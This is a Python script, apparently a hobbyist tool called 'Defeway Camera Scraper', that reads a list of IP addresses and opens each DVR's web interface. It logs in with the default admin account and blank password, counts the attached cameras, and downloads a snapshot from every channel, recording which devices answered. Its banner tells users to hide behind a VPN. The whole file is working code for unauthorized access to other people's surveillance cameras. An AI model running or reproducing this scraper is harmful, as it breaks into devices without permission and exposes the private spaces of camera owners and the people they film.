import urllib.request
from selenium import webdriver
import time

# Requires Selenium and at least Python 3.6
# Opens IP.txt and returns list of IPs
def getIPList():
    list = open('IP.txt').read().split("\n")
    return list

def getCount(ip, driver):
    try:
        url = "http://" + str(ip)
        driver.get(url)
        driver.find_element_by_xpath("/html/body/table/tbody/tr/td/table/tbody/tr[3]/td/table/tbody/tr/td[2]/table/tbody/tr[5]/td[2]/input").click()
        # Give time for page to load before getting source. (Note you can reduce/ remove this if your internet is fast)
        time.sleep(3)
        cAmt = (driver.page_source).count("chn_status")
        return cAmt
    except Exception:
        print("Timeout: Web UI failed to load")

def getSnapshots(ip, camCount):
    print("Getting Snapshots")
    # Save filename as IPpPORTchN
    for channel in range(0, camCount):
        # Python doesn't like : between IP and PORT for f strings so change it to a p 
        newIP = ip.replace(":","p")
        filename = newIP + "ch" + str(channel + 1)
        # Retrieve jpg from snapshot URL - Note: 0KB Files are snapshots that couldnt be retrieved
        try:
            urllib.request.urlretrieve(f"http://{ip}/cgi-bin/snapshot.cgi?chn={channel}&u=admin&p=&q=0&d=0.jpg", f"Snapshots/{filename}.jpg")
            print("Saved " + filename + ".jpg")
        except Exception: 
            print("Error: Downloading Snapshot Failed") 

# Main
list = getIPList()
print("----------------------------------")
print("| Defeway Camera Scraper V1.0b    |")
print("| /!\ Use a VPN                   |")
print("| By: L3K                         |")
print("----------------------------------\n")

print("Loaded IP List Successfully")
print("Loading Web Drivers...\n")
# Note: PhantomJS Deprecated by Selenium
driver = webdriver.PhantomJS()
driver.set_page_load_timeout(5)
print("Loaded Web Drivers Successfully")
print("Using Credentials admin:blank\n")
f = open("WorkingDefewayIPs.txt", "a")

for ip in list:
    start = time.time()
    # Check if DVR is alive and check camera count
    print("Getting Camera count for: " + str(ip))
    camCount = getCount(ip, driver)

    if camCount is None or camCount == 0:
        print("Error: No Cameras Found\n")
    else:
        print("Cameras Found: " + str(camCount) + "\n") 
        f.write(ip + "\n")
        getSnapshots(ip, camCount)

    end = time.time()
    print("Processed In: " + str(round(end - start, 2)) + " seconds\n")

f.close()
driver.quit()